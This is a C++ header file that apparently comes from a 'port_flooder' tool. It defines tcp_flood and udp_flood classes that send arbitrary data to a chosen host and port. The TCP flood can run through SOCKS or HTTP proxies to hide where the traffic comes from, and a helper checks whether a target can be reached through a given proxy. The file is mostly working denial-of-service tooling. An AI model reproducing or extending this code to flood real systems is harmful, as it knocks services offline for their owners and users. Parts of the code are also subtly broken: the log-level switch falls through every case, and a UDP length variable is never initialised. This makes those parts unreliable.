//
// Created by imper on 3/3/22.
//

#ifndef PORT_FLOODER_NETWORK_HPP
#define PORT_FLOODER_NETWORK_HPP

#include <cstdint>
#include <string>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <memory>
#include <netdb.h>
#include <netinet/tcp.h>

#include "proxysocks.hpp"
#include "color.hpp"

#define MAX_QUERIES 4
#define PROXY_CONNECT "CONNECT"
#define PROXY_CONNECT_SIZE ::net::__detail__::consteval_strlen(PROXY_CONNECT)
#define ADDRESS_MAX_LEN ::net::__detail__::consteval_strlen("255.255.255.255:65535")
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

namespace net
{
	namespace __detail__ __attribute__((visibility("hidden")))
	{
		inline static consteval size_t consteval_strlen(const char* str)
		{
			size_t size = 0;
			for (; *str; ++str, ++size);
			return size;
		}
		
		inline static constexpr size_t constexpr_strlen(const char* str)
		{
			size_t size = 0;
			for (; *str; ++str, ++size);
			return size;
		}
		
		inline static void logger_fn(int level, const char* message, void* userdata)
		{
			FILE* stream;
			std::string logging_prefix;
			switch (level)
			{
				case PROXYSOCKET_LOG_DEBUG:
					stream = stdout;
					logging_prefix = COLOR_CYAN COLOR_INTENSE "[DEBUG]" COLOR_RESET COLOR_CYAN;
				case PROXYSOCKET_LOG_ERROR:
					stream = stderr;
					logging_prefix = COLOR_RED COLOR_INTENSE "[ERROR]" COLOR_RESET COLOR_RED;
				case PROXYSOCKET_LOG_INFO:
					stream = stdout;
					logging_prefix = COLOR_BLUE COLOR_INTENSE "[INFO]" COLOR_RESET COLOR_BLUE;
				case PROXYSOCKET_LOG_WARNING:
					stream = stdout;
					logging_prefix = COLOR_YELLOW COLOR_INTENSE "[WARNING]" COLOR_RESET COLOR_YELLOW;
				default:
					stream = stdout;
					logging_prefix = COLOR_WHITE COLOR_FAINT "[UNDEFINED]" COLOR_RESET COLOR_WHITE;
			}
			::fprintf(stream, COLOR_RESET "%s %s" COLOR_RESET "\n", logging_prefix.c_str(), message);
		}
		
		inline static void socket_set_send_timeout(SOCKET sock, long long int ms)
		{
			timeval timeoutdata{ms / 1000, (ms % 1000) * 1000};
			setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const void*)&timeoutdata, sizeof(timeoutdata));
		}
		
		inline static void socket_set_receive_timeout(SOCKET sock, long long int ms)
		{
			timeval timeoutdata{ms / 1000, (ms % 1000) * 1000};
			setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const void*)&timeoutdata, sizeof(timeoutdata));
		}
	}
	
	
	class inet_address
	{
	public:
		inline inet_address(in_addr_t __address, in_port_t __port) : address{AF_INET, ::htons(__port), in_addr{__address}}
		{ }
		
		inline inet_address(std::string __address, bool resolve = true) : address{AF_INET}
		{
			in_port_t port = 80;
			if (__address.starts_with("ftp://"))
			{
				port = 21;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("ftp://"));
			}
			else if (__address.starts_with("ssh://"))
			{
				port = 22;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("ssh://"));
			}
			else if (__address.starts_with("telnet://"))
			{
				port = 23;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("telnet://"));
			}
			else if (__address.starts_with("smtp://"))
			{
				port = 25;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("smtp://"));
			}
			else if (__address.starts_with("dns://"))
			{
				port = 53;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("dns://"));
			}
			else if (__address.starts_with("http://"))
			{
				port = 80;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("http://"));
			}
			else if (__address.starts_with("pop3://"))
			{
				port = 110;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("pop3://"));
			}
			else if (__address.starts_with("ntp://"))
			{
				port = 123;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("ntp://"));
			}
			else if (__address.starts_with("imap://"))
			{
				port = 143;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("imap://"));
			}
			else if (__address.starts_with("snmp://"))
			{
				port = 161;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("snmp://"));
			}
			else if (__address.starts_with("https://"))
			{
				port = 443;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("https://"));
			}
			else if (__address.starts_with("socks5://") || __address.starts_with("socks4://"))
			{
				port = 1080;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("socks5://"));
			}
			else if (__address.starts_with("web://"))
			{
				port = 3128;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("web://"));
			}
			else if (__address.starts_with("rdp://"))
			{
				port = 3389;
				__address.erase(__address.begin(), __address.begin() + __detail__::consteval_strlen("rdp://"));
			}
			
			auto colonpos = __address.find(':');
			if (colonpos != std::string::npos)
			{
				++colonpos;
				port = std::stoul(__address.substr(colonpos));
			}
			hostname = __address.substr(0, colonpos - 1);
			address.sin_port = ::htons(port);
			::inet_aton(hostname.c_str(), &address.sin_addr);
			if (address.sin_addr.s_addr == 0 && resolve)
			{
				auto addr_list = *reinterpret_cast<in_addr**>(::gethostbyname(__address.substr(0, colonpos - 1).c_str())->h_addr_list);
				address.sin_addr = addr_list[0];
			}
		}
		
		[[nodiscard]] inline std::string get_ip() const
		{
			if (address.sin_addr.s_addr)
				return {::inet_ntoa(address.sin_addr)};
			else
				return hostname;
		}
		
		[[nodiscard]] inline in_port_t get_port() const
		{
			return ::ntohs(address.sin_port);
		}
	
	private:
		friend class tcp_flood;
		
		friend class udp_flood;
		
		sockaddr_in address;
		std::string hostname;
	};
	
	enum : int
	{
		r_failed = 0,
		r_success,
		r_read_failed
	};
	
	inline static bool is_address_available_through_proxy(
			const inet_address& address, const inet_address& proxy, int proxytype = PROXYSOCKET_TYPE_NONE,
			const char* proxy_user = "", const char* proxy_password = "",
			bool debug = false)
	{
		proxysocketconfig proxysock_cfg;
		proxysock_cfg = proxysocketconfig_create_direct();
		if (debug)
			proxysocketconfig_set_logging(proxysock_cfg, __detail__::logger_fn, (int*)&debug);
		proxysocketconfig_use_proxy_dns(proxysock_cfg, 1);
		proxysocketconfig_add_proxy(proxysock_cfg, proxytype, proxy.get_ip().c_str(), proxy.get_port(), proxy_user, proxy_password);
		proxysocketconfig_set_timeout(proxysock_cfg, 500, 500);
		char* errmsg;
		int socket;
		if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
		{
			return false;
		}
		proxysocket_disconnect(proxysock_cfg, socket);
		proxysocketconfig_free(proxysock_cfg);
		return true;
	}
	
	class tcp_flood
	{
	public:
		
		inline tcp_flood(
				const inet_address& address, const std::string& data,
				const inet_address* proxy, int proxytype = PROXYSOCKET_TYPE_NONE, const char* proxy_user = "", const char* proxy_password = "",
				bool debug = false)
				: address(address), socket(::socket(PF_INET, SOCK_STREAM, IPPROTO_TCP))
		{
			if (proxy)
			{
				proxysocketconfig proxysock_cfg;
				proxysock_cfg = proxysocketconfig_create_direct();
				if (debug)
					proxysocketconfig_set_logging(proxysock_cfg, __detail__::logger_fn, (int*)&debug);
				proxysocketconfig_use_proxy_dns(proxysock_cfg, 1);
				proxysocketconfig_add_proxy(proxysock_cfg, proxytype, proxy->get_ip().c_str(), proxy->get_port(), proxy_user, proxy_password);
				char* errmsg;
				::close(socket);
				if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
				{
					::printf(
							COLOR_YELLOW COLOR_INTENSE " [ " COLOR_BLUE "%s:%hu" COLOR_YELLOW " ] %s" COLOR_RESET "\n",
							proxy->get_ip().c_str(), proxy->get_port(), errmsg
					);
					status = r_failed;
					return;
				}
				proxysocket_disconnect(proxysock_cfg, socket);
				proxysocketconfig_free(proxysock_cfg);
			}
			else
			{
				if (socket < 0)
				{
					status = r_failed;
					return;
				}
				
				int on = 1;
				::setsockopt(socket, IPPROTO_TCP, TCP_NODELAY, reinterpret_cast<const char*>(&on), sizeof on);
				
				if (debug)
					::printf(
							"Connecting to the server %s:%hu... Sock = %d. Addr = %d.\n",
							address.get_ip().c_str(), address.get_port(), socket, address.address.sin_addr.s_addr
					);
				
				if (::connect(socket, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
				{
					status = r_failed;
					return;
				}
			}
			
			if (debug)
				::printf("Sending data to %s:%hu...\n", address.get_ip().c_str(), address.get_port());
			if (::send(socket, data.c_str(), data.size(), 0) <= 0)
			{
				status = r_failed;
				return;
			}
			
			__detail__::socket_set_receive_timeout(socket, 1000);
			status = r_read_failed;
			std::array<char, 128> tmp{ };
			ssize_t recved;
			if (debug)
				::printf("received = R\"(");
			for (size_t i = 0; ((recved = ::recv(socket, tmp.data(), tmp.size(), 0)) >= 0 || errno == EAGAIN) && i < MAX_QUERIES; ++i)
			{
				::usleep(1000);
				if (debug && recved > 0)
				{
					for (size_t j = 0; j < recved; ++j)
						::printf("%c", tmp[j]);
					status = r_success;
				}
			}
			if (debug)
				::printf(")\"\n");
		}
		
		inline operator decltype(r_failed)()
		{
			return status;
		}
		
		inline ~tcp_flood()
		{
			::close(socket);
		}
	
	private:
		int socket;
		decltype(r_failed) status = r_success;
		inet_address address;
	};
	
	class udp_flood
	{
	public:
		inline udp_flood(const inet_address& address, const std::string& data, bool debug = false)
				: address(address), socket(::socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP))
		{
			if (::sendto(socket, data.c_str(), data.size(), 0, reinterpret_cast<const sockaddr*>(&address.address), sizeof address.address) < 0)
				status = r_failed;
			
			__detail__::socket_set_receive_timeout(socket, 1000);
			status = r_read_failed;
			std::array<char, 128> tmp{ };
			sockaddr_in addr{ };
			socklen_t sz;
			ssize_t recved;
			if (debug)
				printf("received = R\"(");
			for (size_t i = 0; (recved = ::recvfrom(socket, tmp.data(), tmp.size(), 0, reinterpret_cast<struct sockaddr*>(&addr), &sz)) >= 0
							   && addr.sin_addr.s_addr != INADDR_ANY && i < MAX_QUERIES; ++i)
			{
				::usleep(1000);
				if (debug && recved > 0)
				{
					for (size_t j = 0; j < recved; ++j)
						printf("\\%c", tmp[j]);
					status = r_success;
					--i;
				}
			}
			if (debug)
				printf(")\"\n");
		}
		
		inline operator decltype(r_failed)()
		{
			return status;
		}
		
		inline ~udp_flood()
		{
			::close(socket);
		}
	
	private:
		int socket;
		decltype(r_failed) status = r_success;
		inet_address address;
	};
}

#endif //PORT_FLOODER_NETWORK_HPP
